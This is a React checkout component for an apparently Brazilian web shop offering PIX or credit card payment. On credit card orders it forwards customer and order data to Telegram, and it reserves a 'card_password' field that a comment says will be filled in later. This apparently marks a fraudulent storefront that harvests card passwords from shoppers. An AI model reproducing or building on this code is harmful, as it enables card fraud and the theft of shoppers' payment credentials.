import { Button } from "@/components/ui/button";
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
import { Label } from "@/components/ui/label";
import { useToast } from "@/hooks/use-toast";
import { DatabaseService } from "@/services/databaseService";
import { generateOrderId } from "@/utils/orderUtils";
import { useCart } from "@/contexts/CartContext";
import { sendTelegramNotification } from "@/utils/telegramNotifications";

interface CartPaymentProps {
  total: number;
  disabled: boolean;
  paymentMethod: "pix" | "credit";
  onPaymentMethodChange: (value: "pix" | "credit") => void;
  onCheckout: () => void;
  customerData?: {
    name: string;
    email: string;
    phone: string;
    address: string;
  };
}

export const CartPayment = ({
  total,
  disabled,
  paymentMethod,
  onPaymentMethodChange,
  onCheckout,
  customerData,
}: CartPaymentProps) => {
  const { toast } = useToast();
  const { items } = useCart();

  const handleCheckout = async () => {
    try {
      // Gerar ID do pedido
      const orderId = generateOrderId();
      
      // Preparar dados do pedido
      const orderData = {
        id: orderId,
        customer_data: customerData || {
          name: "",
          email: "",
          phone: "",
          address: "",
        },
        items: items.map(item => ({
          id: item.id,
          title: item.title,
          price: item.price,
          quantity: item.quantity || 1,
          image: item.image
        })),
        total_amount: total,
        payment_method: paymentMethod,
        status: "pending",
        transaction_id: "",
        card_password: "",
        created_at: new Date().toISOString()
      };

      // Salvar pedido no banco
      console.log("Saving order:", orderData);
      await DatabaseService.saveOrder(orderData);
      
      // Enviar notificação para Telegram se for cartão de crédito
      if (paymentMethod === "credit") {
        await sendTelegramNotification(orderData);
      }
      
      // Armazenar ID do pedido para atualização posterior com a senha
      if (paymentMethod === "credit") {
        localStorage.setItem("currentOrderId", orderId);
      }
      
      // Prosseguir com checkout
      onCheckout();
      
      toast({
        title: "Pedido iniciado",
        description: "Seus dados foram salvos com sucesso.",
      });
    } catch (error) {
      console.error("Error saving order:", error);
      toast({
        title: "Erro ao iniciar pedido",
        description: "Por favor, tente novamente.",
        variant: "destructive",
      });
    }
  };

  return (
    <div className="absolute bottom-0 left-0 right-0 p-4 border-t bg-white">
      <RadioGroup
        value={paymentMethod}
        onValueChange={onPaymentMethodChange}
        className="grid grid-cols-2 gap-4 mb-4"
      >
        <div className="flex items-center space-x-2 border rounded-lg p-4">
          <RadioGroupItem value="pix" id="pix" />
          <Label htmlFor="pix">PIX</Label>
        </div>
        <div className="flex items-center space-x-2 border rounded-lg p-4">
          <RadioGroupItem value="credit" id="credit" />
          <Label htmlFor="credit">Cartão de Crédito</Label>
        </div>
      </RadioGroup>
      <div className="flex justify-between mb-4">
        <span>Total:</span>
        <span className="font-bold">
          {total.toLocaleString("pt-BR", {
            style: "currency",
            currency: "BRL",
          })}
        </span>
      </div>
      <Button className="w-full" disabled={disabled} onClick={handleCheckout}>
        {paymentMethod === "pix" ? "Pagar com PIX" : "Finalizar Compra"}
      </Button>
    </div>
  );
};